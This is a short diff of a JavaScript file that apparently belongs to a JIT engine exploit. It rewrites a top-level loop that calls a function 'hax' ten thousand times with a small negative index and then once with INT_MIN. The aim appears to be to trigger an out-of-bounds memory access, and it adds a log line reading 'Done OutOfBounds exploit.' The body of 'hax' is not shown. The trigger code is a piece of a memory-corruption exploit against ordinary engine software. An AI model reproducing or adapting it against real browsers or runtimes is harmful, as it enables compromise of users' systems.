@@ -55,14 +55,12 @@ function hax(arr, n) {
     }
 }
 
-function main() {
-    var arr = [1,2,3,4,5,6,7,8,9,10]; 
-    for (let i = 1; i <= ITERATIONS; i++) {
-        let n = -4;
-        if (i == ITERATIONS) {
-            n = -2147483648;        // INT_MIN
-        }
-        hax(arr, n);
+var arr = [1,2,3,4,5,6,7,8,9,10]; 
+for (let i = 1; i <= 10000; i++) {
+    let n = -4;
+    if (i == 10000) {
+        n = -2147483648;        // INT_MIN
     }
-
+    hax(arr, n);
 }
+console.log("Done OutOfBounds exploit.\n");
